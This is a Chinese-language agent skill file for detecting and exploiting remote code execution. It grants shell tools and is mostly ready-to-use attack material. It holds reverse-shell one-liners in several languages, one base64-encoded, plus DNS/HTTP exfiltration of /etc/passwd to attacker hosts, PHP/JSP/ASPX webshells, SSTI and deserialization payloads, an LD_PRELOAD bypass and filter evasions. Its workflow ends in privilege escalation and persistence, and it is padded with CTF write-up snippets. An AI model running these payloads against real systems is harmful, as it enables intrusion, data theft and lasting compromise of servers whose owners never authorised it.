---
name: rce
description: 远程代码执行漏洞检测与利用。当目标存在命令执行、代码执行、反序列化、模板注入、文件上传时使用。
allowed-tools: Bash, Read, Write
---

# 远程代码执行 (RCE)

在目标服务器上执行任意代码或命令，获取系统控制权。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（响应头、源码、错误信息、phpinfo）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。RCE 最短探针顺序：
1. `echo TEST` → 确认输出回显
2. `id`, `whoami` → 确认命令执行
3. 再尝试复杂 payload

### 切换规则
探针无输出时：
- 检查是否是 disable_functions
- 检查是否是 escapeshellcmd 过滤
- 尝试其他命令执行函数（exec/shell_exec/popen）
- 换用文件写入代替命令执行

## 常见指示器

- 命令执行参数（cmd=, exec=, command=, run=）
- 代码执行功能（eval, exec, system）
- 文件上传功能
- 反序列化输入（序列化数据、pickle、Java 对象）
- 模板渲染（Jinja2, Twig, Freemarker）
- 动态包含（include, require）

## 检测方法

### 1. 命令注入测试

```bash
# 基础测试
curl "http://target.com/ping?ip=127.0.0.1;id"
curl "http://target.com/ping?ip=127.0.0.1|id"
curl "http://target.com/ping?ip=127.0.0.1`id`"
curl "http://target.com/ping?ip=127.0.0.1$(id)"

# 时间盲注
curl "http://target.com/ping?ip=127.0.0.1;sleep 5"
curl "http://target.com/ping?ip=127.0.0.1|sleep 5"
```

### 2. 模板注入测试

```bash
# 基础测试
curl "http://target.com/page?name={{7*7}}"
curl "http://target.com/page?name=${7*7}"
curl "http://target.com/page?name=<%= 7*7 %>"
```

## 攻击向量

### 命令注入

```bash
# 命令分隔符
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
\nid

# 常用命令
id
whoami
uname -a
cat /etc/passwd
ls -la
pwd
env

# 反弹 Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 代码注入

```php
// PHP
system($_GET['cmd']);
exec($_GET['cmd']);
passthru($_GET['cmd']);
shell_exec($_GET['cmd']);
eval($_GET['code']);
assert($_GET['code']);
preg_replace('/.*/e', $_GET['code'], '');
```

```python
# Python
eval(user_input)
exec(user_input)
os.system(user_input)
subprocess.call(user_input, shell=True)
__import__('os').system(user_input)
```

### 模板注入 (SSTI)

```python
# Jinja2 (Python)
{{7*7}}
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# 常用 payload
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

```java
// Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

```php
// Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### 反序列化

```python
# Python pickle
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
```

```java
// Java (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

```php
// PHP
O:8:"stdClass":1:{s:4:"test";s:2:"id";}
// 利用 __wakeup, __destruct 等魔术方法
```

### 文件上传 RCE

```php
// PHP webshell
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
<?=`$_GET[0]`?>
<?php passthru($_REQUEST['cmd']); ?>

// 图片马
GIF89a<?php system($_GET['cmd']); ?>

// .htaccess
AddType application/x-httpd-php .jpg
```

```jsp
// JSP webshell
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

```aspx
// ASPX webshell
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>
```

## PHP 回调函数 RCE

### call_user_func / call_user_func_array

**漏洞原理**: 将用户可控的函数名传入 `call_user_func()` 执行

**危险模式**:
```php
// 模式1: 直接函数名传递
call_user_func($_GET['f']);

// 模式2: 带参数传递
call_user_func($_GET['func'], $_GET['arg']);

// 模式3: call_user_func_array
call_user_func_array($_GET['func'], $_GET['args']);
```

**测试 Payload 矩阵**:

| 测试目标 | Payload | 说明 |
|---------|---------|------|
| 基础验证 | `?f=phpinfo` | 显示PHP配置 |
| 命令执行 | `?f=system&arg=whoami` | 执行系统命令 |
| 文件读取 | `?f=file_get_contents&fn=/etc/passwd` | 读取敏感文件 |
| 自定义函数 | `?f=ctfshow_1024` | 直接调用泄露的自定义函数 |

**关键发现**: `call_user_func($_GET['f'])` 只接受一个参数 `f`，额外参数不会被使用！

**利用要点**:
1. 先调用 `phpinfo()` 查看环境信息
2. 搜索自定义函数（如 `ctfshow_xxx`）可能直接返回 flag
3. 搜索 `disable_functions`、`open_basedir`、`FLAG` 环境变量

---

### create_function

**漏洞原理**: 创建匿名函数并执行，第二个参数为代码字符串

**危险模式**:
```php
// 动态创建函数执行
$func = create_function('$code', $_GET['code']);
```

**利用 Payload**:
```php
create_function('', 'system("whoami");');
```

---

### uasort / uksort

**漏洞原理**: 使用用户提供的回调函数处理数组

**危险模式**:
```php
$arr = $_GET['arr'];
uasort($arr, $_GET['callback']);
```

---

### array_map

**漏洞原理**: 对数组每个元素应用回调函数

**危险模式**:
```php
$func = $_GET['func'];
$arr = $_GET['arr'];
array_map($func, $arr);
```

---

## phpinfo 信息泄露利用

**利用场景**:
1. 发现网站存在 `phpinfo()` 函数输出页面
2. LFI+RCE 组合利用时先调用 `phpinfo()` 获取环境信息

**关键信息收集项**:

| 信息类型 | 泄露内容 | 利用价值 |
|---------|---------|---------|
| disable_functions | 被禁用的函数 | 确定绕过方案 |
| open_basedir | 目录限制 | 确定可访问路径 |
| extension_dir | PHP扩展路径 | 确定.so注入位置 |
| upload_tmp_dir | 上传临时目录 | 确定写文件位置 |
| session.save_path | Session存储 | 确定Session文件位置 |
| allow_url_include | 是否允许远程文件包含 | RFI利用条件 |
| FLAG / flag | 环境变量中的flag | 直接获取flag |
| ctfshow_xxx | 自定义函数 | 可能直接返回flag |

**利用要点**:
- phpinfo 中的 `disable_functions` 为空 ≠ 安全，可能是陷阱
- 搜索 `_SERVER['FLAG']` 或 `$FLAG` 环境变量
- 搜索自定义函数段（如 `ctfshow_`），直接调用可能获取 flag

---

## 绕过技术

### 空格绕过

```bash
# 使用 $IFS
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 使用 Tab
cat	/etc/passwd

# 使用大括号
{cat,/etc/passwd}

# 使用 < >
cat</etc/passwd
```

### 关键字绕过

```bash
# 拼接
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量
a=c;b=at;$a$b /etc/passwd

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 十六进制
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# 通配符
/???/??t /???/p??s??
cat /e?c/p?sswd
cat /e*c/p*d
```

### 无回显 RCE

```bash
# DNS 外带
curl http://`whoami`.attacker.com
ping -c 1 `whoami`.attacker.com

# HTTP 外带
curl http://attacker.com/?data=`cat /etc/passwd | base64`
wget http://attacker.com/?data=$(id)

# 时间盲注
if [ $(whoami | cut -c 1) = "r" ]; then sleep 5; fi

# 写文件
id > /var/www/html/output.txt
```

## 常用工具

### commix

```bash
# 自动检测
commix -u "http://target.com/page?cmd=test"

# POST 请求
commix -u "http://target.com/page" --data="cmd=test"

# 获取 shell
commix -u "http://target.com/page?cmd=test" --os-shell
```

### tplmap

```bash
# 模板注入检测
python tplmap.py -u "http://target.com/page?name=test"

# 获取 shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# 指定引擎
python tplmap.py -u "http://target.com/page?name=test" -e jinja2
```

### ysoserial

```bash
# 生成 payload
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'

# 常用 gadget
CommonsCollections1-7
Jdk7u21
Spring1-2
Hibernate1-2
```

## 反弹 Shell

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Netcat

```bash
nc -e /bin/bash 10.0.0.1 4444
nc -c /bin/bash 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 最佳实践

1. 先测试命令注入：使用 ; | ` $() 等分隔符
2. 检查是否有回显，无回显使用时间盲注或外带
3. 测试模板注入：{{7*7}} ${7*7}
4. 检查文件上传功能，尝试上传 webshell
5. 分析反序列化点，使用 ysoserial 生成 payload
6. 使用绕过技术规避过滤
7. 成功 RCE 后尝试反弹 shell
8. 提权并持久化

---

## 来自外部导入内容 (CTF Web - server-side-exec.md)

### Ruby 代码注入

**instance_eval 逃逸:**
```ruby
# 模板: apply_METHOD('VALUE')
# 注入: valid');PAYLOAD#
# 结果: apply_METHOD('valid');PAYLOAD#')
```

**绕过关键字黑名单:**
| 关键字 | 替代方案 |
|--------|---------|
| `File.read` | `Kernel#open` 或类辅助方法 |
| `File.write` | `open('path','w'){\|f\|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

**数据外带:**
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# 或: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

### Ruby ObjectSpace 内存扫描 (Tokyo Westerns 2016)

在无法直接访问变量时，使用 `ObjectSpace.each_object` 扫描堆内存:

```ruby
# 方法1: ObjectSpace 堆扫描
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }

# 方法2: Monkey-patch 访问私有方法
def p.x; flag end; p.x

# 方法3: 使用 send() 绕过私有可见性
p.send(:flag)

# 方法4: 使用 method() 获取方法对象
p.method(:flag).call
```

### Perl open() RCE

遗留的 2 参数 `open()` 允许命令注入:
```perl
open(my $fh, $user_controlled_path);  # 2-arg open 解释模式字符
# 利用: "\|command_here" 或 "command|"
```

### LaTeX 注入 RCE (Hack.lu CTF 2012)

**读取文件:**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**执行命令:**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /flag.txt"}
```

### PHP preg_replace /e Modifier RCE (PlaidCTF 2014)

PHP 的 `preg_replace()` 与 `/e` 修饰符会评估替换字符串作为 PHP 代码:

```php
preg_replace($pattern . "/e", $replacement, $input);
# 如果 $replacement 可被攻击者控制
```

### PHP assert() 字符串评估注入 (CSAW CTF 2016)

```php
assert("strpos('$page', '..') === false");
# 注入: ' and die(show_source('templates/flag.php')) or '
```

### Prolog 注入 (PoliCTF 2015)

```text
# 原始查询: hanoi(USER_INPUT)
# 注入: 关闭原谓词，链式 exec()
3), exec(ls('/')), write('\n'
```

### ReDoS 作为计时 Oracle

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

### 文件上传到 RCE 技术

**.htaccess 上传绕过:**
1. 上传 `.htaccess`: `AddType application/x-httpd-php .lol`
2. 上传 `rce.lol`: `<?php system($_GET['cmd']); ?>`
3. 访问 `rce.lol?cmd=cat+flag.txt`

**PHP 日志污染:**
1. User-Agent 头中注入 PHP payload
2. 路径遍历包含: `....//....//....//var/log/apache2/access.log`

**Python .so 劫持:**
1. 编译: `gcc -shared -fPIC -o auth.so malicious.c`
2. 通过路径遍历上传: `{"filename": "../utils/auth.so"}`
3. 删除 .pyc 强制重新导入

**Gogs Symlink RCE (CVE-2025-8110):**
1. 创建仓库，`ln -s .git/config malicious_link`，推送
2. API 更新 `malicious_link` → 覆盖 `.git/config`
3. 注入 `core.sshCommand` 和反向 shell

### PHP 反序列化 (Cookies)

```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```

### PHP extract() / register_globals 变量覆盖 (SecuInside 2013)

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

### XPath 盲注 (BaltCTF 2013)

```text
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2
```

### API 过滤器/查询参数注入

```bash
# UI 发送: filter={"region":"all"}
# 注入: filter={"region":"all","caseId":"*"}
```

### HTTP 响应头数据隐藏

```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

### WebSocket 批量赋值

```json
{"username": "user", "isAdmin": true}
```

### Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF 绕过 (ApoorvCTF 2026)

```bash
# 步骤1: 通过批量赋值注册为 admin
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# 步骤2: 通过 SpEL 注入
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# 步骤3: 使用 Spring FileCopyUtils 读取 flag
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

### SQLi 关键字分片绕过 (SecuInside 2013)

```php
// 过滤去除 "union"
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
```

### SQL ORDER BY CASE 绕过 (Sharif CTF 2016)

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

### SQL 注入通过 DNS 记录 (PlaidCTF 2014)

设置 PTR 记录指向你的域名，TXT 记录包含 SQL payload。

### Bash 大括号扩展无空格命令注入 (Insomnihack 2016)

```bash
# 大括号扩展插入空格: {cmd,-flag,arg} 扩展为: cmd -flag arg
{ls,-la,../..}

# 通过 UDP 外带: <({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)
```

### Common Lisp 注入通过 Reader Macro (Insomnihack 2016)

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

### PHP7 OPcache 二进制 Webshell + LD_PRELOAD disable_functions 绕过 (ALICTF 2016)

**Stage 1 — OPcache 污染:**
```bash
# 1. 从 phpinfo() 数据计算 system_id
python3 system_id_scraper.py http://target/phpinfo.php

# 2. 通过 SQLi INTO DUMPFILE 上传:
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/.../var/www/html/upload/evil.php.bin'
```

**Stage 2 — LD_PRELOAD 绕过:**
```c
/* evil.c */
void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

### Wget GET 参数文件名技巧 (SECUINSIDE 2016)

```
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'  # 通过 .png 检查
wget 保存为: avatar.png?shell.php  # 服务器视为 PHP
```

### Tar 文件名命令注入 (CyberSecurityRumble 2016)

```bash
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# 上传 — 服务器运行: echo "name; cat /flag #" 在 CGI 上下文中
```

### PNG/PHP 多态上传 + 双扩展名 + disable_functions 绕过 (MetaCTF Flash 2026)

**步骤1: 创建 PNG/PHP 多态:**
```bash
cp valid_image.png polyglot.png.php
cat >> polyglot.png.php << 'PAYLOAD'
<?php
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
        echo "FOUND: $f\n";
        echo file_get_contents("/$f");
    }
}
?>
PAYLOAD
```

**步骤2: 双扩展名上传:**
```bash
curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload
```

**disable_functions 下可用的 PHP 函数:**
```php
scandir('/');              // 列出目录
glob('/flag*');           // glob 模式匹配
file_get_contents('/flag.txt');  // 读取文件
```
